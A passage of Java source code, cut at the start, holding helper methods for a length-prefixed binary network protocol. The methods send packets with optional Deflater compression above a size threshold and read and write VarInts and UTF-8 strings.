        return size;
    }
    
    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }
    
    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        java.util.zip.Deflater deflater = new java.util.zip.Deflater();
        deflater.setInput(data);
        deflater.finish();
        
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }
    
    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
}
